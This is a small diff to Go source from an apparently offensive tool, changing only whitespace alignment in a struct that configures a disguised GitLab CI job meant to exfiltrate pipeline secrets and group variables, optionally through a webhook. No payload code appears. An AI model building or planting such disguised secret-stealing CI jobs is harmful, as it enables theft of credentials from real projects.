@@ -7,10 +7,10 @@ import (
 
 // WorkflowExfilOptions configures the workflow exfil payload.
 type WorkflowExfilOptions struct {
-	Common       CommonOptions
-	DisguiseName string // plausible job name (default: "code-format")
-	WebhookURL   string // optional secondary exfil via HTTP POST
-	DumpGroupVars bool  // also dump group-level variables
+	Common        CommonOptions
+	DisguiseName  string // plausible job name (default: "code-format")
+	WebhookURL    string // optional secondary exfil via HTTP POST
+	DumpGroupVars bool   // also dump group-level variables
 }
 
 // GenerateWorkflowExfilYAML returns a stealthy GitLab CI job that exfiltrates
